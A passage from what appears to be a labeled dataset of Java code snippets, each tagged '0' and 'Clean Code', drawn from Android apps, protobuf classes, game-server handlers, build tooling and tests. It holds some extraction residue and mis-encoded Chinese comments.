      String chainId=Optional.ofNullable(chainNameJsonNode).map(JsonNode::textValue).orElse(null);
      checkChainId(chainId,innerJsonObject.toString());
      if (!chainIdSet.add(chainId)) {
        throw new ChainDuplicateException(String.format(""[chain id duplicate] chainId=%s"",chainId));
      }
      if (!getEnableByJsonNode(innerJsonObject)) {
        continue;
      }
      FlowBus.addChain(chainId);
      if (ElRegexUtil.isAbstractChain(innerJsonObject.get(VALUE).textValue())) {
        abstratChainMap.put(chainId,innerJsonObject);
        Chain chain=FlowBus.getChain(chainId);
        chain.getConditionList().add(new AbstractCondition());
      }
    }
  }
);
  chainIdSet.clear();
  for (  JsonNode flowJsonNode : flowJsonObjectList) {
    Iterator<JsonNode> chainIterator=flowJsonNode.get(FLOW).get(CHAIN).elements();
    while (chainIterator.hasNext()) {
      JsonNode chainNode=chainIterator.next();
      if (!getEnableByJsonNode(chainNode)) {
        continue;
      }
      parseImplChain(abstratChainMap,implChainSet,chainNode);
      JsonNode chainNameJsonNode=Optional.ofNullable(chainNode.get(ID)).orElse(chainNode.get(NAME));
      String chainId=Optional.ofNullable(chainNameJsonNode).map(JsonNode::textValue).orElse(null);
      if (!abstratChainMap.containsKey(chainId)) {
        parseOneChainConsumer.accept(chainNode);
      }
    }
  }
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 10;</code>
 * @param value the battleInfo to set
 * @return this
 */
public ReEnterLastElementStageScRsp setBattleInfo(final SceneBattleInfoOuterClass.SceneBattleInfo value){
  bitField0_|=0x00000004;
  battleInfo.copyFrom(value);
  return this;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  session.send(new PacketGetCurLineupDataScRsp(session));
}
",0,Clean Code
"@Override public HeadIcon mergeFrom(final HeadIcon other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasId()) {
    setId(other.id);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@e6695bb!org.eclipse.jdt.core.dom.MethodDeclaration@4660841e",0,Clean Code
"int getFeedCardType();
",0,Clean Code
"@Override public void onTransitionAnimationEnd(boolean isOpen,boolean backward){
  super.onTransitionAnimationEnd(isOpen,backward);
  if (isOpen && blurredView != null) {
    if (blurredView.getParent() != null) {
      ((ViewGroup)blurredView.getParent()).removeView(blurredView);
    }
    blurredView.setBackground(null);
  }
  notificationsLocker.unlock();
  if (!isOpen) {
    if (opnendForSelect && removeFragmentOnTransitionEnd) {
      removeSelfFromStack();
      if (dialogsActivity != null) {
        dialogsActivity.removeSelfFromStack();
      }
    }
 else     if (finishDialogRightSlidingPreviewOnTransitionEnd) {
      removeSelfFromStack();
      if (parentDialogsActivity != null && parentDialogsActivity.rightSlidingDialogContainer != null) {
        if (parentDialogsActivity.rightSlidingDialogContainer.hasFragment()) {
          parentDialogsActivity.rightSlidingDialogContainer.finishPreview();
        }
      }
    }
  }
}
",0,Clean Code
"/** 
 * @param threadCount # of threads assigned to the workers. Should be at-least the size oftaskWorkers to avoid starvation in a busy system.
 * @return Builder instance
 * @deprecated Use {@link TaskRunnerConfigurer.Builder#withTaskThreadCount(Map)} instead.
 */
@Deprecated public Builder withThreadCount(int threadCount){
  if (threadCount < 1) {
    throw new IllegalArgumentException(""No. of threads cannot be less than 1"");
  }
  this.threadCount=threadCount;
  return this;
}",0,Clean Code
"@Override public String getPlaySourceName(){
  return this.mInfo.getPlaySourceName();
}
",0,Clean Code
"/** 
 * <pre> guess this is the difficulty level </pre> <code>optional uint32 KOLEFJKMFLF = 1;</code>
 * @return whether the kOLEFJKMFLF field is set
 */
public boolean hasKOLEFJKMFLF(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"public static String join(final char delimiter,final String... strings){
  if (strings.length == 0) {
    return null;
  }
  if (strings.length == 1) {
    return strings[0];
  }
  int length=strings.length - 1;
  for (  final String s : strings) {
    if (s == null) {
      continue;
    }
    length+=s.length();
  }
  final StringBuilder sb=new StringBuilder(length);
  if (strings[0] != null) {
    sb.append(strings[0]);
  }
  for (int i=1; i < strings.length; ++i) {
    if (!isEmpty(strings[i])) {
      sb.append(delimiter).append(strings[i]);
    }
 else {
      sb.append(delimiter);
    }
  }
  return sb.toString();
}",0,Clean Code
"@Override public Xml visitTag(Xml.Tag tag,ExecutionContext ctx){
  Xml.Tag plugins=(Xml.Tag)super.visitTag(tag,ctx);
  if (!PLUGINS_MATCHER.matches(getCursor())) {
    return plugins;
  }
  Optional<Xml.Tag> maybePlugin=plugins.getChildren().stream().filter(plugin -> ""plugin"".equals(plugin.getName()) && pluginGroupId.equals(plugin.getChildValue(""groupId"").orElse(null)) && pluginArtifactId.equals(plugin.getChildValue(""artifactId"").orElse(null))).findAny();
  if (!maybePlugin.isPresent()) {
    return plugins;
  }
  Xml.Tag plugin=maybePlugin.get();
  Optional<Xml.Tag> maybeDependencies=plugin.getChild(""dependencies"");
  Xml.Tag dependencies;
  boolean formatAllDependencies=false;
  if (maybeDependencies.isPresent()) {
    dependencies=maybeDependencies.get();
  }
 else {
    formatAllDependencies=true;
    dependencies=Xml.Tag.build(""<dependencies />"").withPrefix(""\n"");
    plugins=addToTag(plugins,plugin,dependencies,getCursor().getParentOrThrow());
  }
  Xml.Tag newDependencyTag=Xml.Tag.build(""<dependency>\n<groupId>"" + groupId + ""</groupId>\n<artifactId>""+ artifactId+ ""</artifactId>""+ ((version == null) ? ""\n"" : ""\n<version>"" + version + ""</version>\n"")+ ""</dependency>"").withPrefix(""\n"");
  Optional<Xml.Tag> maybeExistingDependency=dependencies.getChildren().stream().filter(it -> groupId.equals(it.getChildValue(""groupId"").orElse(null)) && artifactId.equals(it.getChildValue(""artifactId"").orElse(null))).findAny();
  if (maybeExistingDependency.isPresent() && areEqual(newDependencyTag,maybeExistingDependency.get())) {
    return plugins;
  }
  if (maybeExistingDependency.isPresent()) {
    plugins=mapTagChildren(plugins,dependencies,it -> {
      if (it == maybeExistingDependency.get()) {
        return newDependencyTag;
      }
      return it;
    }
);
  }
 else {
    plugins=addToTag(plugins,dependencies,newDependencyTag,getCursor().getParentOrThrow());
  }
  if (formatAllDependencies) {
    plugins=autoFormat(plugins,dependencies,ctx,getCursor().getParentOrThrow());
  }
 else {
    plugins=autoFormat(plugins,newDependencyTag,ctx,getCursor().getParentOrThrow());
  }
  return plugins;
}
",0,Clean Code
"@Override public boolean accept(File pathname){
  if (!m_allowHidden) {
    if (pathname.isHidden()) {
      return false;
    }
  }
  if (m_onlyDirectory) {
    if (!pathname.isDirectory()) {
      return false;
    }
  }
  if (m_ext == null) {
    return true;
  }
  if (pathname.isDirectory()) {
    return true;
  }
  String ext=FileUtil.getExtensionWithoutDot(pathname);
  for (  String e : m_ext) {
    if (ext.equalsIgnoreCase(e)) {
      return true;
    }
  }
  return false;
}
",0,Clean Code
"public void modifyTitle(Object thisObject){
  boolean isApplicatoin=(boolean)XposedHelpers.callMethod(thisObject,""isApplicatoin"");
  if (!isApplicatoin)   return;
  String pkgName=(String)XposedHelpers.callMethod(thisObject,""getPackageName"");
  String newTitle=(String)getAppName(pkgName);
  if (newTitle != null && !newTitle.isEmpty())   XposedHelpers.setObjectField(thisObject,""mLabel"",newTitle);
}
",0,Clean Code
"public static VectorFloat<?> randomVector(int dim){
  Random R=ThreadLocalRandom.current();
  VectorFloat<?> vec=vts.createFloatVector(dim);
  for (int i=0; i < dim; i++) {
    vec.set(i,R.nextFloat());
    if (R.nextBoolean()) {
      vec.set(i,-vec.get(i));
    }
  }
  VectorUtil.l2normalize(vec);
  return vec;
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RogueInfoData)) {
    return false;
  }
  RogueInfoData other=(RogueInfoData)o;
  return bitField0_ == other.bitField0_ && (!hasRogueAeonInfo() || rogueAeonInfo.equals(other.rogueAeonInfo)) && (!hasRogueAreaInfo() || rogueAreaInfo.equals(other.rogueAreaInfo)) && (!hasRogueScoreInfo() || rogueScoreInfo.equals(other.rogueScoreInfo)) && (!hasRogueVirtualItemInfo() || rogueVirtualItemInfo.equals(other.rogueVirtualItemInfo)) && (!hasRogueSeasonInfo() || rogueSeasonInfo.equals(other.rogueSeasonInfo));
}",0,Clean Code
"@Override protected void updateUndoHistory(){
}
",0,Clean Code
"private boolean checkCorner(double x,double y,double z,Vector3d min,Vector3d max){
  pos.set(x,y,z);
  if (!NametagUtils.to2D(pos,1))   return true;
  if (pos.x < min.x)   min.x=pos.x;
  if (pos.y < min.y)   min.y=pos.y;
  if (pos.z < min.z)   min.z=pos.z;
  if (pos.x > max.x)   max.x=pos.x;
  if (pos.y > max.y)   max.y=pos.y;
  if (pos.z > max.z)   max.z=pos.z;
  return false;
}",0,Clean Code
"@Override public RollRogueBuffScRsp clone(){
  return new RollRogueBuffScRsp().copyFrom(this);
}
",0,Clean Code
"public void set(TLRPC.RequestPeerType requestPeerType){
  if (this.requestPeerType != requestPeerType) {
    this.requestPeerType=requestPeerType;
    removeAllViews();
    requirements.clear();
    if (requestPeerType instanceof TLRPC.TL_requestPeerTypeUser) {
      TLRPC.TL_requestPeerTypeUser type=(TLRPC.TL_requestPeerTypeUser)requestPeerType;
      checkRequirement(type.premium,R.string.PeerRequirementPremiumTrue,R.string.PeerRequirementPremiumFalse);
    }
 else {
      boolean isChannel=requestPeerType instanceof TLRPC.TL_requestPeerTypeBroadcast;
      if (isChannel) {
        checkRequirement(requestPeerType.has_username,R.string.PeerRequirementChannelPublicTrue,R.string.PeerRequirementChannelPublicFalse);
        if (requestPeerType.bot_participant != null && requestPeerType.bot_participant) {
          requirements.add(Requirement.make(AndroidUtilities.replaceTags(LocaleController.getString(R.string.PeerRequirementChannelBotParticipant))));
        }
        if (requestPeerType.creator != null && requestPeerType.creator) {
          requirements.add(Requirement.make(AndroidUtilities.replaceTags(LocaleController.getString(R.string.PeerRequirementChannelCreatorTrue))));
        }
      }
 else {
        checkRequirement(requestPeerType.has_username,R.string.PeerRequirementGroupPublicTrue,R.string.PeerRequirementGroupPublicFalse);
        checkRequirement(requestPeerType.forum,R.string.PeerRequirementForumTrue,R.string.PeerRequirementForumFalse);
        if (requestPeerType.bot_participant != null && requestPeerType.bot_participant) {
          requirements.add(Requirement.make(AndroidUtilities.replaceTags(LocaleController.getString(R.string.PeerRequirementGroupBotParticipant))));
        }
        if (requestPeerType.creator != null && requestPeerType.creator) {
          requirements.add(Requirement.make(AndroidUtilities.replaceTags(LocaleController.getString(R.string.PeerRequirementGroupCreatorTrue))));
        }
      }
      if (!(requestPeerType.creator != null && requestPeerType.creator)) {
        checkAdminRights(requestPeerType.user_admin_rights,isChannel,R.string.PeerRequirementUserRights,R.string.PeerRequirementUserRight);
      }
    }
    if (!requirements.isEmpty()) {
      HeaderCell headerCell=new HeaderCell(getContext(),20);
      headerCell.setText(LocaleController.getString(""PeerRequirements"",R.string.PeerRequirements));
      headerCell.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
      addView(headerCell,LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,LayoutHelper.WRAP_CONTENT));
      addView(emptyView(9,Theme.getColor(Theme.key_windowBackgroundWhite)),LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,LayoutHelper.WRAP_CONTENT));
      for (      Requirement requirement : requirements) {
        addView(new RequirementCell(getContext(),requirement),LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,LayoutHelper.WRAP_CONTENT));
      }
      addView(emptyView(12,Theme.getColor(Theme.key_windowBackgroundWhite)),LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,LayoutHelper.WRAP_CONTENT));
      addView(emptyView(12,Theme.getThemedDrawable(getContext(),R.drawable.greydivider_bottom,Theme.key_windowBackgroundGrayShadow)),LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,LayoutHelper.WRAP_CONTENT));
    }
  }
}",0,Clean Code
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  int width=MeasureSpec.getSize(widthMeasureSpec);
  if (deleteImageView != null) {
    deleteImageView.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  if (emojiButton != null) {
    emojiButton.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  if (moveImageView != null) {
    moveImageView.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  if (iconImageView != null) {
    iconImageView.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  if (textView2 != null) {
    textView2.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(24),MeasureSpec.EXACTLY));
  }
  if (checkBox != null) {
    checkBox.measure(MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(48),MeasureSpec.EXACTLY));
  }
  int right;
  if (textView2 == null) {
    right=42;
  }
 else   if (deleteImageView == null) {
    right=70;
  }
 else {
    if (emojiButton != null) {
      right=174;
    }
 else {
      right=122;
    }
  }
  textView.measure(MeasureSpec.makeMeasureSpec(width - getPaddingLeft() - getPaddingRight()- AndroidUtilities.dp(right),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(0,MeasureSpec.UNSPECIFIED));
  int h=textView.getMeasuredHeight();
  setMeasuredDimension(width,Math.max(AndroidUtilities.dp(50),textView.getMeasuredHeight()) + (needDivider ? 1 : 0));
  if (textView2 != null && !alwaysShowText2) {
    textView2.setAlpha(h >= AndroidUtilities.dp(52) ? 1.0f : 0.0f);
  }
}",0,Clean Code
"@Override public void removeUpdate(final DocumentEvent e){
  update();
}
",0,Clean Code
"private ImmutableMultiLabelInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ImmutableMultiLabelInfoProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
  count_=emptyLongList();
  id_=emptyIntList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@9e417d1",0,Clean Code
"public static File getFriendWatchFile(){
  if (friendWatchFile == null) {
    friendWatchFile=new File(getMainDirectoryFile(),""friendWatch.json"");
    if (friendWatchFile.exists() && friendWatchFile.isDirectory())     friendWatchFile.delete();
  }
  return friendWatchFile;
}
",0,Clean Code
"public String toString(){
  return ""Message{role="" + this.role + "", content=""+ this.content+ "", name=""+ this.name+ "", functionCall=""+ this.functionCall+ ""}"";
}
",0,Clean Code
"/** 
 * <code>optional .ExtraLineupType extra_lineup_type = 3;</code>
 * @return whether the extraLineupType field is set
 */
public boolean hasExtraLineupType(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"public static int getCapitalizationType(@NonNull final String text){
  final int len=text.length();
  int index=0;
  for (; index < len; index=text.offsetByCodePoints(index,1)) {
    if (Character.isLetter(text.codePointAt(index))) {
      break;
    }
  }
  if (index == len)   return CAPITALIZE_NONE;
  if (!Character.isUpperCase(text.codePointAt(index))) {
    return CAPITALIZE_NONE;
  }
  int capsCount=1;
  int letterCount=1;
  for (index=text.offsetByCodePoints(index,1); index < len; index=text.offsetByCodePoints(index,1)) {
    if (1 != capsCount && letterCount != capsCount)     break;
    final int codePoint=text.codePointAt(index);
    if (Character.isUpperCase(codePoint)) {
      ++capsCount;
      ++letterCount;
    }
 else     if (Character.isLetter(codePoint)) {
      ++letterCount;
    }
  }
  if (1 == capsCount)   return CAPITALIZE_FIRST;
  return (letterCount == capsCount ? CAPITALIZE_ALL : CAPITALIZE_NONE);
}",0,Clean Code
"public void setFileFilter(final int index){
  setFileFilter(fileFilters.get(index));
}
",0,Clean Code
"static AzureCosmosDbMongoVCoreDocument toMongoDbDocument(String id,Embedding embedding,TextSegment textSegment){
  if (textSegment == null) {
    return new AzureCosmosDbMongoVCoreDocument(id,embedding.vectorAsList(),null,null);
  }
  return new AzureCosmosDbMongoVCoreDocument(id,embedding.vectorAsList(),textSegment.text(),textSegment.metadata().asMap());
}
",0,Clean Code
"@Test void testSuccessfulCall() throws Exception {
  @SuppressWarnings(""unchecked"") Callable<String> mockAction=mock(Callable.class);
  when(mockAction.call()).thenReturn(""Success"");
  String result=RetryUtils.retryPolicyBuilder().delayMillis(100).build().withRetry(mockAction,3);
  assertThat(result).isEqualTo(""Success"");
  verify(mockAction).call();
  verifyNoMoreInteractions(mockAction);
}",0,Clean Code
"@Override public String getMessage(){
  return ErrorMessages.create(""badJsonMissingField"",key,object);
}
",0,Clean Code
"@Override public void onPageSelected(int position){
  changeSelect(position);
  mSearchView.setVisibility(position == 0 ? View.VISIBLE : View.GONE);
}",0,Clean Code
"@Override @NonNull public ObservableQueue getQueue(String queueURI){
  NATSStreamObservableQueue queue=queues.computeIfAbsent(queueURI,q -> new NATSStreamObservableQueue(clusterId,natsUrl,durableName,queueURI,scheduler));
  if (queue.isClosed()) {
    queue.open();
  }
  return queue;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 unlocked_teleport_list = 13;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedInt getMutableUnlockedTeleportList(){
  bitField0_|=0x00000010;
  return unlockedTeleportList;
}",0,Clean Code
"public static boolean isNotSet(MemoryBuffer bitmapBuffer,int baseOffset,int index){
  final int byteIndex=baseOffset + (index >> 3);
  final int bitIndex=index & 7;
  final byte b=bitmapBuffer.getByte(byteIndex);
  return ((b >> bitIndex) & 0x01) == 0;
}",0,Clean Code
"public static void main(String[] args){
  AnnotationConfigApplicationContext context=new AnnotationConfigApplicationContext(MyConfiguration.class);
}
",0,Clean Code
"public Integer getVipLevel(){
  return this.vipLevel;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)10);
    output.writeMessageNoTag(getItemList);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.getItemList,getItemList);
  }
  output.endObject();
}",0,Clean Code
"public static String sha256(byte[] input){
  return hash(input,""SHA-256"");
}",0,Clean Code
"public void selectColor(int color){
  selectColor(color,true);
}
public void selectColor(int color,boolean updateBrush){
  List<Integer> allColors=getAllColors();
  int i=allColors.indexOf(color);
  if (i != -1) {
    if (updateBrush) {
      setCurrentBrushColorByColorIndex(i);
    }
  }
 else {
    List<Integer> from=new ArrayList<>(pendingChange.isEmpty() ? colors : pendingChange);
    pendingChange.clear();
    pendingChange.add(color);
    for (int j=0; j < from.size() - 1; j++) {
      pendingChange.add(from.get(j));
    }
    if (pendingChange.size() < DEFAULT_MODIFIABLE_COLORS.size()) {
      for (int j=pendingChange.size(); j < DEFAULT_MODIFIABLE_COLORS.size(); ++j) {
        pendingChange.add(DEFAULT_MODIFIABLE_COLORS.get(j));
      }
    }
 else     if (pendingChange.size() > DEFAULT_MODIFIABLE_COLORS.size()) {
      pendingChange=pendingChange.subList(0,DEFAULT_MODIFIABLE_COLORS.size());
    }
    if (updateBrush) {
      brushColor.put(currentBrush,color);
      needSaveBrushColor=true;
    }
  }
}",0,Clean Code
"static VmTyped createEmptyModule(){
  return new VmTyped(createEmptyMaterializedFrame(),null,null,EconomicMaps.create());
}
",0,Clean Code
"@Override public boolean advance(){
  if (cs == null) {
    throw new IllegalStateException(""ShapeTokenizer has not been reset."");
  }
  tb.delete(0,tb.length());
  start=pos;
  while (pos < cs.length()) {
    int cp=cs.codePointAt(pos);
    int lcp=Character.charCount(cp);
    currClass=getClass(cp);
    if (tb.length() == 0 && currClass == ' ') {
      pos+=lcp;
      start=pos;
      prevClass=currClass;
      continue;
    }
    if (currClass != prevClass && prevClass != -1) {
      if (!(prevClass == 'A' && currClass == 'a')) {
        if (tb.length() > 0) {
          token=tb.toString();
          prevClass=currClass;
          ready=true;
          return true;
        }
      }
    }
    if (currClass != ' ') {
      tb.appendCodePoint(cp);
    }
    prevClass=currClass;
    pos+=lcp;
    end=pos;
  }
  if (tb.length() > 0) {
    token=tb.toString();
    ready=true;
    return true;
  }
  return false;
}",0,Clean Code
"/** 
 * <code>repeated .ClientMail notice_mail_list = 2;</code>
 * @return this
 */
public GetMailScRsp clearNoticeMailList(){
  bitField0_&=~0x00000010;
  noticeMailList.clear();
  return this;
}",0,Clean Code
"public String getWording(){
  return this.wording;
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueStartScRsp}
 */
public static ChessRogueStartScRsp newInstance(){
  return new ChessRogueStartScRsp();
}
",0,Clean Code
"/** 
 * Swaps the positions of 2 avatars on a lineup
 * @param index Index of the lineup we are swapping avatars on
 * @param src 1st avatar slot
 * @param dest 2nd avatar slot
 * @return true on success
 */
public boolean swapLineup(int index,int src,int dest){
  if (src == dest)   return false;
  PlayerLineup lineup=this.getLineupByIndex(index);
  if (lineup == null)   return false;
  if (!lineup.isActiveSlot(src) || !lineup.isActiveSlot(dest)) {
    return false;
  }
  int srcId=lineup.getAvatars().get(src);
  int destId=lineup.getAvatars().get(dest);
  lineup.getAvatars().set(src,destId);
  lineup.getAvatars().set(dest,srcId);
  lineup.save();
  player.sendPacket(new PacketSyncLineupNotify(lineup));
  return true;
}",0,Clean Code
"public Builder addMetadataColumn(SchemaColumn column){
  Preconditions.checkArgument(this.metadataColumns.stream().noneMatch((sc) -> sc.name().equals(column.name())),""A metadata column with name %s has already been added"",column.name());
  this.metadataColumns.add(column);
  return this;
}
",0,Clean Code
"private MergerProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private MergerProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6b838fb7",0,Clean Code
"private static void toHTML_5_withinStyle(StringBuilder out,CharSequence text,int start,int end){
  for (int i=start; i < end; i++) {
    char c=text.charAt(i);
    if (c == '\n') {
      out.append(""<br>"");
    }
 else     if (c == '<') {
      out.append(""&lt;"");
    }
 else     if (c == '>') {
      out.append(""&gt;"");
    }
 else     if (c == '&') {
      out.append(""&amp;"");
    }
 else     if (c >= 0xD800 && c <= 0xDFFF) {
      if (c < 0xDC00 && i + 1 < end) {
        char d=text.charAt(i + 1);
        if (d >= 0xDC00 && d <= 0xDFFF) {
          i++;
          int codepoint=0x010000 | (int)c - 0xD800 << 10 | (int)d - 0xDC00;
          out.append(""&#"").append(codepoint).append("";"");
        }
      }
    }
 else     if (c > 0x7E || c < ' ') {
      out.append(""&#"").append((int)c).append("";"");
    }
 else     if (c == ' ') {
      while (i + 1 < end && text.charAt(i + 1) == ' ') {
        out.append(""&nbsp;"");
        i++;
      }
      out.append(' ');
    }
 else {
      out.append(c);
    }
  }
}",0,Clean Code
"@PostMapping(""/delete/{attendanceRuleId}"") @ApiOperation(""鍒犻櫎鑰冨嫟瑙勫垯"") @OperateLog(apply=ApplyEnum.HUMAN_RESOURCE_MANAGEMENT,type=OperateTypeEnum.SETTING,behavior=BehaviorEnum.DELETE,object=OperateObjectEnum.HUMAN_ATTENDANCE_RULE_SETTING) public Result deleteAttendanceRule(@PathVariable(""attendanceRuleId"") Long attendanceRuleId){
  OperationLog operationLog=attendanceRuleService.deleteAttendanceRule(attendanceRuleId);
  return OperationResult.ok(operationLog);
}
",0,Clean Code
"protected boolean scaleSample(HeightmapTile src,int srcX,int srcZ,int layer,HeightmapData data){
  double height0=src.getLayerOnlyHeight(srcX,srcZ,layer);
  double height1=src.getLayerOnlyHeight(srcX,srcZ + 1,layer);
  double height2=src.getLayerOnlyHeight(srcX + 1,srcZ,layer);
  double height3=src.getLayerOnlyHeight(srcX + 1,srcZ + 1,layer);
  double sum=0.0d;
  double cnt=0.0d;
  if (!Double.isNaN(height0)) {
    sum+=height0;
    cnt++;
  }
  if (!Double.isNaN(height1)) {
    sum+=height1;
    cnt++;
  }
  if (!Double.isNaN(height2)) {
    sum+=height2;
    cnt++;
  }
  if (!Double.isNaN(height3)) {
    sum+=height3;
    cnt++;
  }
  if (cnt == 0.0d) {
    return false;
  }
  double avg=sum / cnt;
  double d0=Double.isNaN(height0) ? Double.NEGATIVE_INFINITY : abs(height0 - avg);
  double d1=Double.isNaN(height1) ? Double.NEGATIVE_INFINITY : abs(height1 - avg);
  double d2=Double.isNaN(height2) ? Double.NEGATIVE_INFINITY : abs(height2 - avg);
  double d3=Double.isNaN(height3) ? Double.NEGATIVE_INFINITY : abs(height3 - avg);
  if (!Double.isNaN(height0) && d0 >= d1 && d0 >= d2 && d0 >= d3) {
    src.getLayer(srcX,srcZ,layer,data);
  }
 else   if (!Double.isNaN(height1) && d1 >= d0 && d1 >= d2 && d1 >= d3) {
    src.getLayer(srcX,srcZ + 1,layer,data);
  }
 else   if (!Double.isNaN(height2) && d2 >= d0 && d2 >= d1 && d2 >= d3) {
    src.getLayer(srcX + 1,srcZ,layer,data);
  }
 else {
    src.getLayer(srcX + 1,srcZ + 1,layer,data);
  }
  return true;
}",0,Clean Code
"/** 
 * <code>optional sint32 int_value = 5;</code>
 * @param value the intValue to set
 * @return this
 */
public RogueDialogueEventParam setIntValue(final int value){
  bitField0_|=0x00000008;
  intValue=value;
  return this;
}",0,Clean Code
"/** 
 * <pre> 鎿嶄綔璇︽儏 </pre> <code>string operation_info = 10;</code>
 * @param value The bytes for operationInfo to set.
 * @return This builder for chaining.
 */
public Builder setOperationInfoBytes(com.google.protobuf.ByteString value){
  if (value == null) {
    throw new NullPointerException();
  }
  checkByteStringIsUtf8(value);
  operationInfo_=value;
  onChanged();
  return this;
}",0,Clean Code
"@SuppressWarnings(""unchecked"") protected Map<String,Set<String>> toPropertySigns(String json){
  if (StringUtil.isEmpty(json))   return Collections.EMPTY_MAP;
  Map<String,Set<String>> propertySigns=new HashMap<>();
  Map<String,Object> jsonMap=JsonSupport.parse(json,Map.class,null);
  if (jsonMap == null)   jsonMap=Collections.EMPTY_MAP;
  for (  Map.Entry<String,Object> entry : jsonMap.entrySet()) {
    Set<String> signs=new HashSet<>();
    Object valueObj=entry.getValue();
    if (valueObj instanceof String)     signs.add((String)valueObj);
 else     if (valueObj instanceof Collection<?>) {
      Collection<String> valueCollection=(Collection<String>)valueObj;
      signs.addAll(valueCollection);
    }
 else     if (valueObj instanceof Object[]) {
      Object[] valueArray=(Object[])valueObj;
      for (      Object value : valueArray) {
        if (value instanceof String)         signs.add((String)value);
      }
    }
    propertySigns.put(entry.getKey(),signs);
  }
  return propertySigns;
}
",0,Clean Code
"private void highlight(int start,int end,ArrayList<MessageObject.TextLayoutBlock> textLayoutBlocks){
  if (textLayoutBlocks == null) {
    return;
  }
  int length=end - start;
  for (int c=0; c < textLayoutBlocks.size(); c++) {
    MessageObject.TextLayoutBlock block=textLayoutBlocks.get(c);
    if (start >= block.charactersOffset && start < block.charactersEnd) {
      linkSelectionBlockNum=c;
      resetUrlPaths();
      try {
        LinkPath path=obtainNewUrlPath();
        path.setUseCornerPathImplementation(true);
        path.setCurrentLayout(block.textLayout,start,0);
        block.textLayout.getSelectionPath(start,end,path);
        path.closeRects();
        float y=block.height + block.padBottom;
        if (end >= block.charactersOffset + length) {
          for (int a=c + 1; a < textLayoutBlocks.size(); a++) {
            MessageObject.TextLayoutBlock nextBlock=textLayoutBlocks.get(a);
            length=nextBlock.charactersEnd - nextBlock.charactersOffset;
            path=obtainNewUrlPath();
            path.setUseCornerPathImplementation(true);
            y+=nextBlock.padTop;
            path.setCurrentLayout(nextBlock.textLayout,0,y);
            y+=nextBlock.height + nextBlock.padBottom;
            nextBlock.textLayout.getSelectionPath(0,end - nextBlock.charactersOffset,path);
            path.closeRects();
            if (end < block.charactersOffset + length - 1) {
              break;
            }
          }
        }
        if (highlightedQuote) {
          isHighlightedAnimated=true;
          highlightProgress=2500;
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      invalidate();
      break;
    }
  }
  highlightCaptionToSetStart=-1;
  highlightCaptionToSetEnd=-1;
}",0,Clean Code
"@Override public boolean pushIfNotExists(String queueName,String messageId,long offsetTimeInSecond){
  return pushIfNotExists(queueName,messageId,0,offsetTimeInSecond);
}
@Override public boolean pushIfNotExists(String queueName,String messageId,int priority,long offsetTimeInSecond){
  return getWithRetriedTransactions(tx -> {
    if (!existsMessage(tx,queueName,messageId)) {
      pushMessage(tx,queueName,messageId,null,priority,offsetTimeInSecond);
      return true;
    }
    return false;
  }
);
}",0,Clean Code
"@Override public RogueBuffEnhanceInfo clone(){
  return new RogueBuffEnhanceInfo().copyFrom(this);
}
",0,Clean Code
"@Override public View.OnClickListener addRestartListener(){
  mSecurity=getResources().getString(!isMoreHyperOSVersion(1f) ? (!isPad() ? R.string.security_center : R.string.security_center_pad) : R.string.security_center_hyperos);
  return view -> ((BaseSettingsActivity)getActivity()).showRestartDialog(mSecurity,""com.miui.securitycenter"");
}",0,Clean Code
"@Test public void testInvalidSizeSearchWorkflowsV2(){
  ConstraintViolationException ex=assertThrows(ConstraintViolationException.class,() -> workflowService.searchWorkflowsV2(0,6000,""asc"",""*"",""*""));
  assertEquals(1,ex.getConstraintViolations().size());
  Set<String> messages=getConstraintViolationMessages(ex.getConstraintViolations());
